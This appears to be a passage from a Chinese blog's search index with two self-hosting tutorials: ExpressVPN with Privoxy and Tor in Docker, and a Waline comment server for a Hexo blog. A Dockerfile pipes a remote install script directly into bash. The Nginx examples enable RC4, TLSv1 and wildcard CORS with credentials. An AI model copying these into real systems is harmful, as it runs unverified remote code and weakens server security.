polkaned/privoxy-tor-expressvpn \\ /bin/bash Docker-Compose 运行容器docker-compose.yml 文件的内容如下： 12345678910111213141516171819202122version: "3.5"services: expressvpn: container_name: expressvpn image: polkaned/privoxy-tor-expressvpn:latest privileged: true restart: always environment: - ACTIVATION_CODE={% your-activation-code %} - SERVER={% LOCATION/ALIAS/COUNTRY %} cap_add: - NET_ADMIN devices: - /dev/net/tun ports: - 9050:9050 - 9052:9052 - 8118:8118 tty: true stdin_open: true command: /bin/bash 若其他容器需要使用 ExpressVPN，那么可以参考以下配置内容： 1234567891011121314151617181920212223242526272829version: "3.5"services: expressvpn: container_name: expressvpn image: polkaned/privoxy-tor-expressvpn:latest privileged: true restart: always environment: - ACTIVATION_CODE={% your-activation-code %} - SERVER={% LOCATION/ALIAS/COUNTRY %} cap_add: - NET_ADMIN devices: - /dev/net/tun ports: - 9050:9050 - 9052:9052 - 8118:8118 tty: true stdin_open: true command: /bin/bash downloader: image: example/downloader container_name: downloader network_mode: service:expressvpn depends_on: - expressvpn 通过 Docker-Compose 创建并启动 Docker 容器 12345# 创建并启动容器# docker-compose up -d# 查看容器的日志信息# docker logs -f --tail 20 expressvpn 测试 Privoxy 与 Tor 代理是否可用12345# 测试Privoxy$ curl -I -x 127.0.0.1:8118 www.google.com# 测试Tor$ curl --socks5 127.0.0.1:9050 www.google.com 进阶配置Privoxy 代理 Tor（可选）若希望 Privoxy 代理 Tor，可以在 /etc/privoxy/config 配置文件的末尾添加以下内容： 1forward-socks5 / 0.0.0.0:9050 . 限制请求来源的 IP（可选）若希望限制访问 Privoxy 代理服务的 IP，即新增 IP 白名单，则可以在 /etc/privoxy/config 配置文件的末尾添加以下内容： 123456# 编辑配置文件，IP需要根据实际情况进行更改# vim /etc/privoxy/configpermit-access 14.215.177.38/26# 重启容器让配置变更生效# docker restart expressvpn 挂载本地配置文件（可选）1）启动 Docker 容器后，分别拷贝一份 Privoxy、Tor 的配置文件到本地磁盘 1234567# 创建本地的配置文件目录# mkdir -p /usr/local/tor# mkdir -p /usr/local/privoxy# 拷贝容器里的配置文件到本地磁盘# docker cp expressvpn:/etc/tor/torrc /usr/local/tor/torrc# docker cp expressvpn:/etc/privoxy/config /usr/local/privoxy/config 2）创建 Privoxy 的 user.action 配置文件，用于阻止 Privoxy 指向服务器本身的 IP 和域名，这里请替换为你自己真实服务器的 IP 和域名 12345# 创建文件$ touch /usr/local/privoxy/user.action# 写入以下内容到文件中$ vim /usr/local/privoxy/user.action 12{+block{block ip and domain which point to server itself}}127.0.0.1 3）创建 Privoxy 的 user.filter 配置文件，用于存放 Privoxy 的过滤规则，暂时不需要填写任何内容 1$ touch /usr/local/privoxy/user.filter 4）更改 docker-compose.yml 文件，添加数据卷的配置内容（如下所示） 123456789101112131415161718192021222324252627version: "3.5"services: expressvpn: container_name: expressvpn image: polkaned/privoxy-tor-expressvpn:latest privileged: true restart: always environment: - ACTIVATION_CODE={% your-activation-code %} - SERVER={% LOCATION/ALIAS/COUNTRY %} cap_add: - NET_ADMIN devices: - /dev/net/tun ports: - 9050:9050 - 9052:9052 - 8118:8118 volumes: - /usr/local/tor/torrc:/etc/privoxy/torrc - /usr/local/privoxy/config:/etc/privoxy/config - /usr/local/privoxy/user.action:/etc/privoxy/user.action - /usr/local/privoxy/user.filter:/etc/privoxy/user.filter tty: true stdin_open: true command: /bin/bash VPN 管理与测速ExpressVPN 常用管理命令123456789101112131415161718192021# 优化ExpressVPN的配置# docker exec -it expressvpn expressvpn protocol lightway_udp# docker exec -it expressvpn expressvpn preferences set desktop_notifications false# 查看ExpressVP的配置信息# docker exec -it expressvpn expressvpn preferences# 查看ExpressVPN的连接状态# docker exec -it expressvpn expressvpn status# 查看ExpressVPN的可连接地区# docker exec -it expressvpn expressvpn list# 连接VPN（智能连接）# docker exec -it expressvpn expressvpn connect# 连接VPN，并指定连接的地区# docker exec -it expressvpn expressvpn connect jpyo# 断开VPN连接# docker exec -it expressvpn expressvpn disconnect ExpressVPN 使用 SpeedTest 测速12345# 测速# docker exec -it expressvpn speedtest# 测速，并指定网速的显示单位# docker exec -it expressvpn speedtest -u kB/s SpeedTest 支持显示的网速单位如下： 1234Decimal prefix, bits per second: bps, kbps, Mbps, GbpsDecimal prefix, bytes per second: B/s, kB/s, MB/s, GB/sBinary prefix, bits per second: kibps, Mibps, GibpsBinary prefix, bytes per second: kiB/s, MiB/s, GiB/s 常见问题ExpressVPN 版本更新若日后希望更新 ExpressVPN 的版本，只需要执行以下两步操作即可： 1）更改 Dockerfile 里 ExpressVPN 安装包的文件名 1234FROM debian:bullseye-slim...ARG APP=expressvpn_3.18.1.0-1_amd64.deb... 2）重新构建 Docker 镜像 1# docker build --pull --no-cache --rm --force-rm -f Dockerfile -t polkaned/privoxy-tor-expressvpn:latest . Chrome 浏览器使用 Privoxy 代理若希望 Chrome 浏览器智能切换至 Docker + ExpressVPN + Privoxy/Tor 提供的代理服务（实现国内外流量分流功能），可以安装 SwitchyOmega 浏览器插件来实现，具体使用方式这里不再累述，更多资料可参考以下链接： Proxy SwitchyOmega 的项目地址 Proxy SwitchyOmega 的 Chrome 应用商店安装地址 构建 Docker 镜像时无法科学上网在上面的教程里，必须保证可以科学上网才能正常构建 Docker 镜像。特殊情况下，可能无法提供科学上网的条件，此时可以通过其他途径手动下载 ExpressVPN 最新版本的 Debian/Ubuntu 安装包，并将安装包重命名为 expressvpn_amd64.deb，然后更改上面的 Dockerfile 的内容（如下所示），这样就可以直接构建 Docker 镜像，不再需要依赖科学上网了。 123456789101112131415161718192021222324252627FROM debian:bullseye-slimLABEL maintainer="benjamin@polkaned.net"ENV ACTIVATION_CODE CodeENV LOCATION smartCOPY expressvpn_amd64.deb /tmp/expressvpn_amd64.debRUN dpkg -i /tmp/expressvpn_amd64.deb &amp;&amp; rm -rf /tmp/expressvpn_amd64.debRUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends \\ curl apt-utils apt-transport-https dirmngr ca-certificates expect iproute2 procps libnm0 gnupg2 tor privoxy \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; sed -i \\ -e \'s/#SocksPort 192.168.0.1:9100/SocksPort 0.0.0.0:9050/g\' \\ -e \'s/#ControlPort 9051/ControlPort 9052/g\' \\ /etc/tor/torrc \\ &amp;&amp; sed -i \\ -e \'s/listen-address\\s*127.0.0.1:8118/listen-address 0.0.0.0:8118/g\' \\ /etc/privoxy/config \\ &amp;&amp; curl -s https://install.speedtest.net/app/cli/install.deb.sh | bash \\ &amp;&amp; apt-get install speedtestCOPY entrypoint.sh /tmp/entrypoint.shCOPY expressvpnActivate.sh /tmp/expressvpnActivate.shENTRYPOINT ["/bin/bash", "/tmp/entrypoint.sh"] 参考资料 Tor Privoxy ExpressVPN Dockerfiles Docker 安装 Privoxy 代理服务 Centos7 安装 ExpressVPN 客户端 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"容器化 开发工具"},{title:"Hexo Next 主题使用 Waline 评论系统",url:"/posts/ae18fb85.html",text:'前言版本说明本文使用的各软件版本如下所示，教程内容虽然会持续更新，但一切内容以 Waline 官方文档为准。 软件 版本 描述 linux CentOS 7.9 docker 20.10.5 mysql 5.7.26 node 14.17.3 hexo 5.4.0 next 8.11.1 waline-admin 0.17.3 waline-client 2.0.7 waline-server 1.14.0 Hexo 评论系统选择Hexo 各类评论系统的对比可看这里，之前博客一直使用的评论系统是基于 Github Issue 的 Utterances。由于 Utterances 默认没有 CDN 加速，经常造成页面加载完成后无法正常显示 Utterances 的评论区，而且需用用户登录 Github 账号才能评论，因此打算更换博客的评论系统。国外的 Disqus、Hypercomments 暂时不考虑，国内访问被墙的概率很大。Gitment、Gitalk、Gitter 和 Utterances 一样，访问速度不太稳定，且登录 Github 才能评论，暂时也不考虑。这一波排除下来，剩下的方案只有 Valine、Isso、Waline 或者 自建评论系统。考虑到 Valine 依赖 Leancloud 第三方服务，且需要在 Leancloud 额外部署 Valine Admin 才能实现邮件通知与评论管理等功能，这样一来感觉也不靠谱，万一 Leancloud 以后退出商业市场竞争呢？综合考虑下来，最终选择了 Waline 评论系统，一款从 Valine 衍生的带后端评论系统，支持多种部署方式和数据存储方式，这样就可以省去 自建评论系统 的开发成本，同时也可以尽量少依赖第三方服务，增加日后扩展和维护的自由度。 Hexo 评论系统介绍Valine 评论系统Valine 是一款基于 Leancloud 的快速、简洁且高效的无后端评论系统，用户无需登录即可评论，目前已有 Hexo、Jekyll、Typecho、Hugo、Ghost 等博客程序在使用。由于 Valine 自身不支持邮件通知支持，因此诞生了 Valine Admin 开源项目；一个对 Valine 评论系统的拓展应用，可增强 Valine 的邮件通知功能；基于 Leancloud 的云引擎与云函数，主要实现评论邮件通知、评论管理、自定义邮件通知模板等功能，而且还可以提供邮件 通知博主 和 @ 通知 的功能。 Waline 评论系统Waline 一款从 Valine 衍生的带后端评论系统，可以将 Waline 等价成 With backend Valine，采用 Client/Server 架构并基于 NodeJS 开发。Valine 支持 MarkDown 语法、邮件通知、评论管理、多种部署方式、多种数据存储方式。 Waline 客户端脚本 服务端部署 数据存储 @waline/client Vercel LeanCloud MiniValine CloudBase CloudBase Docker MongoDB 独立部署 MySQL SQLite PostgreSQL Github Waline 支持的功能： 邮件通知 微信通知 QQ 通知 Telegram 通知 Akismet 反垃圾评论 文章统计 多语言 自定义语言支持 登录支持 评论管理 评论删除 其它数据库服务支持（已支持 LeanCloud, MySQL, MongoDB, SQLite, PostgreSQL) 基于 IP 的评论发布频率限制 基于关键词的评论过滤限制 IP 黑名单 重复内容检测 CloudBase 腾讯云开发部署支持 社交登录 AWS, GCP, Azure 部署支持 置顶评论 评论赞踩 Docker 部署 MySQL Server使用 Docker 部署 MySQL，容器管理工具使用 Docker-Compose。 Doker 部署 MySQL在下述的 Docker-Compose 配置里，指定了 MySQL 容器的静态 IP 地址与系统时区，yourPassword 为数据库密码，/usr/local/docker-volumes/mysql/* 是 MySQL 容器各个数据卷目录的路径 1234567891011121314151617181920212223242526272829version: "3.5"services: mysql: image: mysql:5.7.26 container_name: waline-mysql restart: always privileged: false environment: TZ: \'Asia/Shanghai\' MYSQL_ROOT_PASSWORD: yourPassword ports: - 3306:3306 networks: waline-network: ipv4_address: 172.23.0.3 volumes: - \'/usr/local/docker-volumes/mysql/conf:/etc/mysql/conf.d\' - \'/usr/local/docker-volumes/mysql/data:/var/lib/mysql\' - \'/usr/local/docker-volumes/mysql/log:/var/log/mysql\' command: --default-authentication-plugin=mysql_native_passwordnetworks: waline-network: name: waline-network driver: bridge ipam: config: - subnet: 172.23.0.0/24 MySQL 数据库表初始化创建并启动 MySQL 的 Docker 容器后，导入最新的 waline.sql 脚本来创建好 Waline Server 所需的数据库表，其中相关表的结构如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950CREATE DATABASE waline DEFAULT CHARACTER SET utf8mb4;CREATE TABLE `wl_Comment` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `user_id` int(11) DEFAULT NULL, `comment` text, `insertedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `ip` varchar(100) DEFAULT \'\', `link` varchar(255) DEFAULT NULL, `mail` varchar(255) DEFAULT NULL, `nick` varchar(255) DEFAULT NULL, `pid` int(11) DEFAULT NULL, `rid` int(11) DEFAULT NULL, `sticky` boolean DEFAULT NULL, `status` varchar(50) NOT NULL DEFAULT \'\', `ua` text, `url` varchar(255) DEFAULT NULL, `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;CREATE TABLE `wl_Counter` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `time` int(11) DEFAULT NULL, `url` varchar(255) NOT NULL DEFAULT \'\', `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;CREATE TABLE `wl_Users` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `display_name` varchar(255) NOT NULL DEFAULT \'\', `email` varchar(255) NOT NULL DEFAULT \'\', `password` varchar(255) NOT NULL DEFAULT \'\', `type` varchar(50) NOT NULL DEFAULT \'\', `url` varchar(255) DEFAULT NULL, `avatar` varchar(255) DEFAULT NULL, `github` varchar(255) DEFAULT NULL, `twitter` varchar(255) DEFAULT NULL, `facebook` varchar(255) DEFAULT NULL, `google` varchar(255) DEFAULT NULL, `weibo` varchar(255) DEFAULT NULL, `qq` varchar(255) DEFAULT NULL, `2fa` varchar(32) DEFAULT NULL, `createdAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, `updatedAt` timestamp NULL DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; Docker 部署 Waline Server使用 Docker 部署 Waline Server，数据存储方式选择 MySQL，容器管理工具使用 Docker-Compose。 构建 Waline Server 镜像若不希望自己构建 Waline Server 的 Docker 镜像，可以直接使用 Waline 官方的 Docker 镜像，操作步骤如下： 12345678# 拉取最新的代码# git clone https://github.com/lizheming/waline.git# 进入代码目录# cd waline/packages/server/# 构建镜像# docker build -t lizheming/waline -f Dockerfile . 值得一提的是，官方提供的 Dockerfile 默认会使用最新的 Waline Server 代码来构建 Docker 镜像，若希望使用本地的 Waline Server 代码（经过更改的）来构建 Docker 镜像，需要自行更改 Dockerfile 的内容（如下所示）；为了统一使用东八区时区，建议更改系统默认的时区。 12345678910111213141516171819# https://github.com/nodejs/LTSFROM node:lts AS buildWORKDIR /appENV NODE_ENV productionRUN set -eux; \\ # npm config set registry https://registry.npmmirror.com; \\ npm install --production --silent @waline/vercel# use local source codeRUN rm -rf /app/node_modules/@waline/vercel/src/*COPY ./src/ /app/node_modules/@waline/vercel/srcFROM node:lts-buster-slimWORKDIR /appRUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeENV TZ Asia/ShanghaiENV NODE_ENV productionCOPY --from=build /app .EXPOSE 8360CMD ["node", "node_modules/@waline/vercel/vanilla.js"] 提示 若构建 Waline Server 的 Docker 镜像时，一直卡在 NPM 安装模块的过程里，可以更改对应的 Dockerfile（如下所示），使用淘宝的 NPM 源来加速 NPM 模块下载 123456$ vim waline/packages/server/Dockerfile...（省略）npm config set registry https://registry.npmmirror.com; \\npm install --production --silent @waline/vercel...（省略） Docker 部署 Waline Server在上面 MySQL 的 Docker-Compose 配置基础上，指定 Waline Server 容器的静态 IP 地址 与 Waline Server 启动时所需的环境变量 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758version: "3.5"services: mysql: image: mysql:5.7.26 container_name: waline-mysql restart: always privileged: false environment: TZ: \'Asia/Shanghai\' MYSQL_ROOT_PASSWORD: yourPassword ports: - 3306:3306 networks: waline-network: ipv4_address: 172.23.0.3 volumes: - \'/usr/local/docker-volumes/mysql/conf:/etc/mysql/conf.d\' - \'/usr/local/docker-volumes/mysql/data:/var/lib/mysql\' - \'/usr/local/docker-volumes/mysql/log:/var/log/mysql\' command: --default-authentication-plugin=mysql_native_password waline: container_name: waline image: lizheming/waline:latest restart: always privileged: false depends_on: - mysql ports: - 8360:8360 networks: waline-network: ipv4_address: 172.23.0.4 environment: TZ: "Asia/Shanghai" AKISMET_KEY: "false" DISABLE_USERAGENT: "true" SITE_NAME: "Your site name" SECURE_DOMAINS: "example.cn" AUTHOR_EMAIL: "example@qq.com" SITE_URL: "https://www.example.cn" MYSQL_HOST: 172.23.0.3 MYSQL_PORT: 3306 MYSQL_DB: waline MYSQL_PREFIX: wl_ MYSQL_USER: root MYSQL_PASSWORD: yourPassword volumes: - /usr/local/waline/data:/app/datanetworks: waline-network: name: waline-network driver: bridge ipam: config: - subnet: 172.89.0.0/24 Waline Server 的环境变量Waline Server 的 自身环境变量如下： 环境变量名称 必填 默认值 备注 TZ 时区 SITE_URL 站点 URL SITE_NAME 站点名称 AUTHOR_EMAIL 博主邮箱 SECURE_DOMAINS 安全域名配置，支持逗号分隔配置多个域名，配置后非该域名来源的请求会返回 403 状态码，不配置表示允许所有域名来源 IPQPS 60 基于 IP 的评论发布频率限制，单位为秒。默认为 60 秒，设置为 0 不限制 DISABLE_USERAGENT false 是否隐藏评论者的 UA，默认为否 COMMENT_AUDIT 评论发布审核开关，默认为否，配置后建议在 Placehoder 上提供文案提示 AKISMET_KEY Akismet 反垃圾评论服务的 Key（默认开启，不用请设置为 false，关闭后可以加快评论提交的速度） AVATAR_PROXY https://avatar.75cdn.workers.dev/ 头像的代理地址，设置 false 可以关闭代理 LOGIN 当设置为 LOGIN: \'force\' 时，服务端会要求客户端必须登录才能评论；同时 Waline 客户端需要增加 login： force 的配置用于隐藏博客页面上的评论匿名输入框 GRAVATAR_STR https://seccdn.libravatar.org/avatar/{{mail|md5}} Gravatar 头像的地址，基于 Nunjucks 语法 OAUTH_URL https://user.75.team OAuth 第三方登录服务地址，也可以使用 auth 自建 COMMENT_AUDIT：阅读源代码发现，环境变量中不配置 COMMENT_AUDIT，则默认关闭评论发布的审核功能，只要在环境变量中添加了该属性，无论属性值是什么，都会开启评论发布的审核功能 Waline Server 的 MySQL 环境变量如下： 环境变量名称 必填 默认值 备注 MYSQL_HOST 127.0.0.1 MySQL 服务的地址 MYSQL_PORT 3306 MySQL 服务的端口 MYSQL_DB ✓ MySQL 数据库库名 MYSQL_USER ✓ MySQL 数据库的用户名 MYSQL_PASSWORD ✓ MySQL 数据库的密码 MYSQL_PREFIX wl_ MySQL 数据表的表前缀 MYSQL_CHARSET utf8mb4 MySQL 数据表的字符集 Waline Server 运行测试分别创建并启动 MySQL 与 Waline Server 容器，然后浏览器访问 http://ip:port/ui/register，打开 Waline Server 的 Web 管理界面进行注册，第一个注册的用户会被 Waline Server 识别为系统管理员（博主），成功登录后的界面如下： 若 Waline Server 的 Web 管理界面无法正常访问，可以使用以下命令查看 Docker 容器的日志来定位问题 1# docker logs -f --tail 20 waline Waline Server 配置反向代理Nginx 反向代理配置若使用 Nginx 作为 Waline Server 的反向代理，可参考以下配置内容。 12345678910111213141516171819202122232425262728293031323334353637server { listen 80; listen 443 ssl; server_name www.example.com if ($server_port !~ 443){ rewrite ^(/.*)$ https://$host$1 permanent; } # SSL 证书 ssl_certificate /usr/local/nginx/cert/waline.example.com.crt; ssl_certificate_key /usr/local/nginx/cert/waline.example.com.key; # SSL 性能调优 ssl_session_timeout 10m; ssl_prefer_server_ciphers on; ssl_session_cache shared:SSL:10m; ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; ssl_ciphers ECDHE-RSA-AES256-SHA384:AES256-SHA256:RC4:HIGH:!MD5:!aNULL:!eNULL:!NULL:!DH:!EDH:!AESGCM; add_header Strict-Transport-Security \'max-age=31536000\'; location / { # 反向代理 proxy_pass http://$server_name; proxy_set_header Host $host:$server_port; proxy_set_header X-NginX-Proxy true; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header REMOTE-HOST $remote_addr; # 缓存 add_header X-Cache $upstream_cache_status; add_header Cache-Control no-cache; expires 12h; }} Nginx 配置跨域访问默认情况下，当在 Waline 服务端的环境变量里添加了 SITE_URL 属性，那么 Nginx 的反向代理不再需要配置跨域，因为 Waline Server 会自动将 SITE_URL 添加到允许跨域的名单里。若 Waline Server 自带的跨域配置不能满足要求，可以参考以下内容自行配置 Nginx 的跨域。 123456789101112131415161718192021222324252627location /comment { # 清除Waline自带的跨域Header proxy_hide_header Access-Control-Allow-Origin; proxy_hide_header Access-Control-Allow-Methods; proxy_hide_header Access-Control-Allow-Headers; proxy_hide_header Access-Control-Allow-Credentials; # 添加自定义的跨域Header add_header \'Access-Control-Allow-Origin\' \'*\' always; add_header \'Access-Control-Allow-Credentials\' \'true\' always; add_header \'Access-Control-Allow-Methods\' \'GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONS\' always; add_header \'Access-Control-Allow-Headers\' \'Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Origin\' always; # 反向代理 proxy_pass http://$server_name; proxy_set_header Host $host:$server_port; proxy_set_header X-NginX-Proxy true; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header REMOTE-HOST $remote_addr; # 缓存 add_header X-Cache $upstream_cache_status; add_header Cache-Control no-cache; expires 12h;} (adsbygoogle = window.adsbygoogle || []).push({}); Next 主题安装 Waline 官方插件安装 Waline 官方插件Waline 官方插件的版本必须与 Next 主题的版本匹配，否则 Waline 官方插件无法正常使用，两者的兼容性说明如下： Next 主题的版本 Waline 官方插件的版本 &lt;= 8.3.0 &lt;= 1.0.8 &gt;= 8.4.0 &gt;= 2.0.0 12345# 进入博客的根目录$ cd /blog-root# 安装Waline插件（默认是最新版本）$ npm install @waline/hexo-next --save 配置 Waline 官方插件更改 Next 主题的配置文件 themes/next/_config.yml，添加以下内容，其中 serverURL 是 Waline Server 的访问 URL，需要自行更改该属性的值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# Waline Config File# For more information:# - https://waline.js.org# - https://waline.js.org/reference/component.htmlwaline: # New! Whether enable this plugin enable: true # Waline server address url, you should set this to your own link serverURL: https://waline.vercel.app # Waline library CDN url, you can set this to your preferred CDN # libUrl: https://unpkg.com/@waline/client@v2/dist/waline.js # Waline CSS styles CDN url, you can set this to your preferred CDN cssUrl: https://unpkg.com/@waline/client@v2/dist/waline.css # Custom locales # locale: # placeholder: Welcome to comment # Comment box placeholder # If false, comment count will only be displayed in post page, not in home page commentCount: true # Pageviews count, Note: You should not enable both `waline.pageview` and `leancloud_visitors`. pageview: false # Custom emoji # emoji: # - https://unpkg.com/@waline/emojis@1.0.1/weibo # - https://unpkg.com/@waline/emojis@1.0.1/alus # - https://unpkg.com/@waline/emojis@1.0.1/bilibili # - https://unpkg.com/@waline/emojis@1.0.1/qq # - https://unpkg.com/@waline/emojis@1.0.1/tieba # - https://unpkg.com/@waline/emojis@1.0.1/tw-emoji # Comment infomation, valid meta are nick, mail and link # meta: # - nick # - mail # - link # Set required meta field, e.g.: [nick] | [nick, mail] # requiredMeta: # - nick # Language, available values: en-US, zh-CN, zh-TW, pt-BR, ru-RU, jp-JP # lang: zh-CN # Word limit, no limit when setting to 0 # wordLimit: 0 # Whether enable login, can choose from \'enable\', \'disable\' and \'force\' # login: enable # comment per page # pageSize: 10 更改 Next 主题的样式由于 Next 主题默认对所有图片都添加了 display: block; CSS 样式，这会导致 Waline 的表情包图片独立一行显示，需要往 Next 主题里添加以下自定义样式来解决，例如更改样式文件 themes/next/source/css/_common/scaffolding/base.styl 123.wl-content .vemoji, .wl-content .wl-emoji { display: inline !important;} Hexo 构建失败的解决方法若 Next 主题安装 Waline 官方插件后，执行 hexo g 命令抛出以下异常，这是由于 Hexo 或者 Next 的版本过低导致，此时需要升级 Hexo 或者 Next 的版本 1234567891011121314151617181920212223ERROR Render HTML failed: index.htmlTypeError: Cannot read property \'parent\' of null at Function.exports.update (/usr/local/hexo/node_modules/cheerio/lib/parse.js:55:26) at module.exports (/usr/local/hexo/node_modules/cheerio/lib/parse.js:17:11) at Function.exports.load (/usr/local/hexo/node_modules/cheerio/lib/static.js:22:14) at Hexo.hexoMetaGeneratorInject (/usr/local/hexo/node_modules/hexo/lib/plugins/filter/meta_generator.js:8:21) at Hexo.tryCatcher (/usr/local/hexo/node_modules/bluebird/js/release/util.js:16:23) at Hexo.&lt;anonymous&gt; (/usr/local/hexo/node_modules/bluebird/js/release/method.js:15:34) at Promise.each.filter (/usr/local/hexo/node_modules/hexo/lib/extend/filter.js:60:50) at tryCatcher (/usr/local/hexo/node_modules/bluebird/js/release/util.js:16:23) at Object.gotValue (/usr/local/hexo/node_modules/bluebird/js/release/reduce.js:166:18) at Object.gotAccum (/usr/local/hexo/node_modules/bluebird/js/release/reduce.js:155:25) at Object.tryCatcher (/usr/local/hexo/node_modules/bluebird/js/release/util.js:16:23) at Promise._settlePromiseFromHandler (/usr/local/hexo/node_modules/bluebird/js/release/promise.js:547:31) at Promise._settlePromise (/usr/local/hexo/node_modules/bluebird/js/release/promise.js:604:18) at Promise._settlePromiseCtx (/usr/local/hexo/node_modules/bluebird/js/release/promise.js:641:10) at _drainQueueStep (/usr/local/hexo/node_modules/bluebird/js/release/async.js:97:12) at _drainQueue (/usr/local/hexo/node_modules/bluebird/js/release/async.js:86:9) at Async._drainQueues (/usr/local/hexo/node_modules/bluebird/js/release/async.js:102:5) at Immediate.Async.drainQueues [as _onImmediate] (/usr/local/hexo/node_modules/bluebird/js/release/async.js:15:14) at runCallback (timers.js:705:18) at tryOnImmediate (timers.js:676:5) at processImmediate (timers.js:658:5) Waline 第三方插件列表hexo-waline-next hexo-waline-next，一款更强大且适用于 Next 主题的 Waline 插件，支持上传评论图片到七牛图床 hexo-next-darkmode hexo-next-darkmode，一款适用于 Waline 与 Next 主题的暗黑模式切换插件，详细的使用说明请看这里 Waline 进阶配置客户端使用 CDNWaline 客户端若想使用 CDN 加速，只需在 Next 主题的 _config.yml 配置文件中，更改 Waline 官方插件的配置（如下所示）即可。由于 Waline 采用 Client/Server 架构，客户端与服务端的版本一般需要匹配才能正常运行；因此不建议每次自动都获取最新版的客户端文件，而是推荐日后统一更新客户端与服务端的版本。 123456789# 获取最新版本的Walinewaline: libUrl: https://unpkg.com/@waline/client@v2/dist/waline.js cssUrl: https://unpkg.com/@waline/client@v2/dist/waline.css# 获取指定版本的Walinewaline: libUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.js cssUrl: https://unpkg.com/@waline/client@2.0.7/dist/waline.css 验证用户注册邮箱用户注册和评论的邮件通知都会用到邮件服务，配置邮件服务相关变量后，用户注册流程会增加邮箱验证码确认相关的操作，用来防止恶意的注册。 环境变量名称 备注 SMTP_SERVICE SMTP 邮件发送服务提供商 SMTP_HOST SMTP 服务器地址，一般可以在邮箱的设置中找到。 SMTP_PORT SMTP 服务器端口，一般可以在邮箱的设置中找到。 SMTP_USER SMTP 邮件发送服务的用户名，一般为登录邮箱。 SMTP_PASS SMTP 邮件发送服务的密码，一般为邮箱登录密码，部分邮箱 (例如 163) 是单独的 SMTP 密码。 SENDER_NAME 自定义发送邮件的发件人 SENDER_EMAIL 自定义发送邮件的发件地址 提示：可以在这里查看支持的邮箱服务商，SMTP_SERVICE 和 (SMTP_HOST、SMTP_PORT）任选其一进行配置即可。如果在邮箱服务商列表中没有对应的 SMTP_SERVICE ，则需要同时配置 SMTP_HOST 和 SMTP_PORT。 客户端配置用户头像Waline 目前使用 Libravatar 来获取评论列表头像。Libravatar 是自由、开放的头像服务，支持联邦托管并与 Gravatar 完全兼容。首先博主或者用户自行使用邮箱登录或注册 Libravatar，然后更改自己的 Libravatar 头像。当在博客评论的时候，留下在 Libravatar 注册时所使用的邮箱即可，或者使用 Waline 客户端提供的登录功能；最后 Waline 会自动根据邮箱地址去 Libravatar 获取用户的头像，当未能从 Libravatar 查询到头像时，将会自动转为从 Gravatar 查询。目前 Waline 非自定义头像有以下 7 种默认值可选： 在 Waline Server 中，通过配置环境变量 GRAVATAR_STR 来指定 Libravatar 头像服务的地址（基于 Nunjucks 语法），这样就可以自定义客户端所使用的用户头像类型，如下所示： 1GRAVATAR_STR: \'https://seccdn.libravatar.org/avatar/{{mail|md5}}?d=retro\' 特别注意 尽管诸如谷歌、QQ 等邮件提供商对电子邮件不区分大小写，但是你仍需要保证 Libravatar 或者 Gravatar 注册的邮箱和填入的邮箱地址对应。虽然全球大部分大型邮件提供商均不对电子邮件用户名区分大小写，但是根据 RFC 5231 的规定，电子邮件是区分大小写的。这意味着邮件提供商可以将 abc@xxx.com 和 ABC@xxx.com 视为不同的账号，而且也的确有邮件提供商这样处理。所以为防止使用此类邮件提供商的用户无法收到邮件或显示错误的头像，Waline 并不会对邮箱进行大小写转换。 服务端配置评论通知当博客有用户发布评论或者用户回复评论时，Waline 支持对博主和回复评论作者进行通知。博主评论通知支持邮件、微信、QQ 与 Telegram，回复评论作者仅支持邮件通知。由于篇幅有限，这里仅介绍邮箱通知的配置，其他的通知方式可参考官方文档。邮件通知需要在环境变量中配置以下属性： AUTHOR_EMAIL：博主邮箱，用来区分发布的评论是否是博主本身发布的。如果是博主发布的则不进行提醒通知。 SMTP_SERVICE：SMTP 邮件发送服务提供商，可以在 这里 查看所有支持的运营商。如果没在列表中的可以自行配置 SMTP_HOST 和 SMTP_PORT。 SMTP_HOST：SMTP 服务器地址，一般可以在邮箱的设置中找到。如果未配置 SMTP_SERVICE 的话该项必填。 SMTP_PORT：SMTP 服务器端口，一般可以在邮箱的设置中找到。如果未配置 SMTP_SERVICE 的话该项必填。 SMTP_USER：SMTP 邮件发送服务的用户名，一般为登录邮箱。 SMTP_PASS：SMTP 邮件发送服务的密码，一般为邮箱登录密码，部分邮箱（例如 163）是单独的 